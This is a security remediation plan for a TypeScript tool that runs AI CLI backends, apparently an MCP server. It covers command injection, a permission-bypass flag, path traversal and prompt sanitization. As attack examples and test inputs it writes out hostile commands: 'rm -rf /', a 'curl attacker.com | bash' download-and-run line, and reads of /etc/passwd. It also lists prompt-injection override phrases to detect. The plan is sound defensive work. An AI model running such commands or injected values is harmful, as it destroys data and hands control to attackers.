---
title: Security Remediation Plan
version: 1.0.0
updated: 2026-01-24T18:13:00+01:00
scope: unitai-security
category: plan
subcategory: security
status: draft
domain: [security, command-injection, input-validation, permissions]
related_issues: [SEC-001, SEC-002, SEC-003, SEC-004, SEC-005, SEC-006]
audit_source: Triangulated review (Qwen, Droid, Gemini) - 2026-01-24
changelog:
  - 1.0.0 (2026-01-24): Initial plan consolidating security audit findings.
---

# Security Remediation Plan

## Executive Summary

**Audit Date**: 2026-01-24  
**Audit Method**: Triangulated AI review (3 backends)  
**Critical Issues**: 3  
**High Issues**: 2  
**Production Ready**: ❌ NO until Critical fixes complete

---

## Phase 1: Critical Fixes (MUST DO)

### SEC-001: Command Injection in detectBackends.ts

#### Current Code (VULNERABLE)

**File**: `src/config/detectBackends.ts:56-62`

```typescript
function isCommandAvailable(command: string): boolean {
  try {
    execSync(`which ${command}`, { stdio: 'ignore' });  // ⚠️ INJECTION
    return true;
  } catch {
    return false;
  }
}
```

#### Attack Vector

```typescript
const malicious = "gemini; rm -rf /";
isCommandAvailable(malicious);
// Executes: which gemini; rm -rf /
```

#### Remediation

```typescript
import { spawnSync } from 'child_process';

// Whitelist of allowed backend commands
const ALLOWED_BACKEND_COMMANDS = [
  'gemini',
  'droid', 
  'qwen',
  'cursor-agent',
  'rovodev'
] as const;

type BackendCommand = typeof ALLOWED_BACKEND_COMMANDS[number];

function isValidBackendCommand(command: string): command is BackendCommand {
  return ALLOWED_BACKEND_COMMANDS.includes(command as BackendCommand);
}

function isCommandAvailable(command: string): boolean {
  // 1. Whitelist check FIRST
  if (!isValidBackendCommand(command)) {
    logger.warn(`Rejected unknown command: ${command}`);
    return false;
  }

  try {
    // 2. Use spawnSync with shell: false
    const result = spawnSync('which', [command], {
      stdio: 'ignore',
      shell: false,
      timeout: 5000
    });
    return result.status === 0;
  } catch {
    return false;
  }
}
```

#### Tasks

- [ ] Add `ALLOWED_BACKEND_COMMANDS` constant
- [ ] Add `isValidBackendCommand()` type guard
- [ ] Replace `execSync` with `spawnSync` + `shell: false`
- [ ] Add timeout parameter
- [ ] Add logging for rejected commands
- [ ] Update unit tests

#### Acceptance Criteria

- `isCommandAvailable("gemini; rm -rf /")` returns `false`
- Only whitelisted commands can be checked
- No shell interpretation of input

---

### SEC-002: Unrestricted Command Execution

#### Current Code (VULNERABLE)

**File**: `src/utils/commandExecutor.ts:19-36`

```typescript
export async function executeCommand(
  command: string,
  args: string[],
  options: ExecutionOptions = {}
): Promise<string> {
  // No validation of command!
  const child = spawn(command, args, {
    shell: false,
    stdio: ["pipe", "pipe", "pipe"]
  });
  // ...
}
```

#### Attack Vector

```typescript
await executeCommand('/bin/bash', ['-c', 'curl attacker.com | bash']);
// Executes arbitrary code
```

#### Remediation

```typescript
import path from 'path';

// Whitelist of allowed executables
const ALLOWED_COMMANDS: Record<string, string> = {
  'gemini': 'gemini',
  'droid': 'droid',
  'qwen': 'qwen',
  'cursor-agent': 'cursor-agent',
  'rovodev': 'rovodev',
  'git': 'git',
  'npm': 'npm',
  'which': 'which'
};

// Dangerous argument patterns
const DANGEROUS_PATTERNS = [
  /[;&|`$()]/,           // Shell metacharacters
  /\.\.\//,              // Path traversal
  /^-.*=.*\$/,           // Variable injection
];

function validateCommand(command: string): string {
  const allowed = ALLOWED_COMMANDS[command];
  if (!allowed) {
    throw new Error(`Command not allowed: ${command}`);
  }
  return allowed;
}

function validateArgs(args: string[]): string[] {
  return args.map(arg => {
    for (const pattern of DANGEROUS_PATTERNS) {
      if (pattern.test(arg)) {
        throw new Error(`Dangerous argument pattern detected: ${arg}`);
      }
    }
    return arg;
  });
}

function validateCwd(cwd: string | undefined): string {
  if (!cwd) return process.cwd();
  
  const resolved = path.resolve(cwd);
  const projectRoot = path.resolve(process.cwd());
  
  if (!resolved.startsWith(projectRoot)) {
    throw new Error(`Working directory outside project: ${cwd}`);
  }
  
  if (resolved.includes('..')) {
    throw new Error(`Path traversal in cwd: ${cwd}`);
  }
  
  return resolved;
}

export async function executeCommand(
  command: string,
  args: string[],
  options: ExecutionOptions = {}
): Promise<string> {
  const { onProgress, timeout = 600000, cwd } = options;

  // SECURITY: Validate all inputs
  const safeCommand = validateCommand(command);
  const safeArgs = validateArgs(args);
  const safeCwd = validateCwd(cwd);

  logger.debug(`Executing: ${safeCommand} ${safeArgs.join(" ")}`);

  return new Promise((resolve, reject) => {
    const child = spawn(safeCommand, safeArgs, {
      shell: false,
      cwd: safeCwd,
      stdio: ["pipe", "pipe", "pipe"]
    });
    // ... rest unchanged
  });
}
```

#### Tasks

- [ ] Add `ALLOWED_COMMANDS` whitelist
- [ ] Add `DANGEROUS_PATTERNS` array
- [ ] Implement `validateCommand()`
- [ ] Implement `validateArgs()`
- [ ] Implement `validateCwd()`
- [ ] Update `executeCommand()` to validate before spawn
- [ ] Add tests for rejected commands and patterns

#### Acceptance Criteria

- `executeCommand('/bin/bash', ['-c', 'evil'])` throws error
- `executeCommand('gemini', ['prompt'])` works
- Path traversal in cwd rejected
- Shell metacharacters in args rejected

---

### SEC-003: Permission Bypass Flag

#### Current Code (VULNERABLE)

**File**: Multiple workflow files

```typescript
// Found in workflows using Droid
args: ['exec', '--skip-permissions-unsafe']  // ⚠️ BYPASSES SECURITY
```

#### Remediation

**Option A**: Remove flag entirely

```bash
# Search and remove all occurrences
grep -r "skip-permissions-unsafe" src/
# Replace with proper permission handling
```

**Option B**: Environment-gated bypass

```typescript
// In permissionManager.ts
export function isPermissionBypassAllowed(): boolean {
  // Only allow in development/testing
  if (process.env.NODE_ENV === 'production') {
    return false;
  }
  if (process.env.UNITAI_ALLOW_PERMISSION_BYPASS !== 'true') {
    return false;
  }
  logger.warn('Permission bypass enabled - NOT FOR PRODUCTION');
  return true;
}

// Usage
if (needsPermissionBypass && !isPermissionBypassAllowed()) {
  throw new Error('Permission bypass not allowed in this environment');
}
```

#### Tasks

- [ ] Search all usages: `grep -r "skip-permissions-unsafe" src/`
- [ ] Remove or gate each usage
- [ ] Add `isPermissionBypassAllowed()` function
- [ ] Add `NODE_ENV` check
- [ ] Update all workflow files
- [ ] Add integration test for bypass rejection

#### Acceptance Criteria

- No `--skip-permissions-unsafe` in production code paths
- Bypass only works with explicit env var in non-production

---

## Phase 2: High Priority Fixes

### SEC-004: Path Traversal in Attachments

#### Current Code (VULNERABLE)

**File**: `src/utils/aiExecutor.ts`

```typescript
if (attachments && attachments.length > 0) {
  attachments.forEach(file => {
    args.push('--file', file);  // ⚠️ No validation
  });
}
```

#### Remediation

```typescript
import { existsSync, statSync } from 'fs';
import path from 'path';

const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

function validateFilePath(filePath: string): string {
  const resolved = path.resolve(filePath);
  const projectRoot = path.resolve(process.cwd());

  // 1. Must be within project
  if (!resolved.startsWith(projectRoot)) {
    throw new Error(`File outside project: ${filePath}`);
  }

  // 2. No traversal sequences
  if (filePath.includes('..')) {
    throw new Error(`Path traversal detected: ${filePath}`);
  }

  // 3. File must exist
  if (!existsSync(resolved)) {
    throw new Error(`File not found: ${filePath}`);
  }

  // 4. Size limit
  const stats = statSync(resolved);
  if (stats.size > MAX_FILE_SIZE) {
    throw new Error(`File too large: ${filePath} (${stats.size} bytes)`);
  }

  return resolved;
}

// Usage in all executors
if (attachments && attachments.length > 0) {
  attachments.forEach(file => {
    const safePath = validateFilePath(file);
    args.push('--file', safePath);
  });
}
```

#### Tasks

- [ ] Create `validateFilePath()` in new file `src/utils/pathValidator.ts`
- [ ] Update `executeGeminiCLI()`
- [ ] Update `executeDroidCLI()`
- [ ] Update `executeQwenCLI()`
- [ ] Update `executeCursorAgentCLI()`
- [ ] Add tests for path traversal rejection

#### Acceptance Criteria

- `../../../etc/passwd` rejected
- Absolute paths outside project rejected
- Files > 10MB rejected

---

### SEC-005: Prompt Sanitization

#### Current Code (VULNERABLE)

```typescript
const args = [prompt];  // Direct pass-through
```

#### Remediation

```typescript
const MAX_PROMPT_LENGTH = 50000;

// Patterns that indicate prompt injection attempts
const SUSPICIOUS_PATTERNS = [
  /ignore\s+previous\s+instructions/gi,
  /forget\s+your\s+(rules|instructions)/gi,
  /you\s+are\s+now\s+a/gi,
  /\bsudo\b/gi,
  /\brm\s+-rf\b/gi,
];

function sanitizePrompt(prompt: string): { 
  sanitized: string; 
  warnings: string[] 
} {
  const warnings: string[] = [];
  let sanitized = prompt;

  // 1. Length check
  if (sanitized.length > MAX_PROMPT_LENGTH) {
    sanitized = sanitized.substring(0, MAX_PROMPT_LENGTH);
    warnings.push(`Prompt truncated to ${MAX_PROMPT_LENGTH} chars`);
  }

  // 2. Pattern detection (warn but don't block)
  for (const pattern of SUSPICIOUS_PATTERNS) {
    if (pattern.test(prompt)) {
      warnings.push(`Suspicious pattern detected: ${pattern.source}`);
      // Log for audit but don't modify - AI backends should handle
    }
  }

  // 3. Log warnings to audit trail
  if (warnings.length > 0) {
    logger.warn('Prompt sanitization warnings', { warnings });
  }

  return { sanitized, warnings };
}

// Usage
export async function executeGeminiCLI(options) {
  const { prompt, ...rest } = options;
  
  if (!prompt || !prompt.trim()) {
    throw new Error(ERROR_MESSAGES.NO_PROMPT_PROVIDED);
  }

  const { sanitized, warnings } = sanitizePrompt(prompt);
  
  // Continue with sanitized prompt
  args.push(sanitized);
  // ...
}
```

#### Tasks

- [ ] Create `sanitizePrompt()` in `src/utils/promptSanitizer.ts`
- [ ] Add to all backend executors
- [ ] Log suspicious patterns to audit trail
- [ ] Add MAX_PROMPT_LENGTH constant
- [ ] Add tests

#### Acceptance Criteria

- Prompts > 50k chars truncated
- Suspicious patterns logged
- Audit trail records warnings

---

## Phase 3: Medium Priority

### SEC-006: Rate Limiting (Optional for MCP)

Note: Rate limiting is less critical for local MCP servers. Implement if deploying remotely.

```typescript
// Simple in-memory rate limiter
class RateLimiter {
  private calls: Map<string, number[]> = new Map();
  
  constructor(
    private maxCalls: number = 100,
    private windowMs: number = 60000
  ) {}

  check(key: string): boolean {
    const now = Date.now();
    const calls = this.calls.get(key) || [];
    
    // Remove old calls
    const recent = calls.filter(t => now - t < this.windowMs);
    
    if (recent.length >= this.maxCalls) {
      return false;
    }
    
    recent.push(now);
    this.calls.set(key, recent);
    return true;
  }
}
```

---

## Implementation Order

```
Day 1-2: SEC-001 (detectBackends.ts)
Day 2-3: SEC-002 (commandExecutor.ts)
Day 3-4: SEC-003 (permission bypass)
Day 4-5: SEC-004 (path traversal)
Day 5-6: SEC-005 (prompt sanitization)
Day 7:   Testing & Integration
```

---

## Testing Checklist

### Command Injection (SEC-001, SEC-002)

```bash
# These should all fail/be rejected:
npm test -- --grep "command injection"
```

- [ ] `gemini; rm -rf /` → rejected
- [ ] `$(whoami)` → rejected
- [ ] `` `id` `` → rejected
- [ ] `|cat /etc/passwd` → rejected

### Path Traversal (SEC-004)

- [ ] `../../../etc/passwd` → rejected
- [ ] `/etc/passwd` → rejected (outside project)
- [ ] `./valid/file.ts` → allowed
- [ ] Symlink to outside → rejected

### Permission Bypass (SEC-003)

- [ ] `--skip-permissions-unsafe` in production → rejected
- [ ] Same in development without env var → rejected
- [ ] Same in development with env var → allowed (with warning)

---

## Files Modified Summary

| File | Changes |
|------|---------|
| `src/config/detectBackends.ts` | Whitelist, spawnSync |
| `src/utils/commandExecutor.ts` | Validation layer |
| `src/utils/pathValidator.ts` | NEW - path validation |
| `src/utils/promptSanitizer.ts` | NEW - prompt sanitization |
| `src/utils/permissionManager.ts` | Bypass gating |
| `src/utils/aiExecutor.ts` | Use validators |
| All `*.workflow.ts` files | Remove bypass flag |

---

## Verification

After implementation, run:

```bash
# 1. Unit tests
npm test

# 2. Security-specific tests
npm test -- --grep "security"

# 3. Manual verification
node -e "require('./dist/config/detectBackends.js').isCommandAvailable('gemini; echo pwned')"
# Should return false

# 4. Triangulated re-audit
# Run triangulated-review again to confirm fixes
```

---

## Related Documents

- `ssot_unitai_architecture_2026-01-24.md` - System architecture
- `ssot_unitai_known_issues_2026-01-24.md` - Issue registry (contains SEC-* issues)
- `plan_unitai_di_2026-01-24.md` - DI fixes (completed)
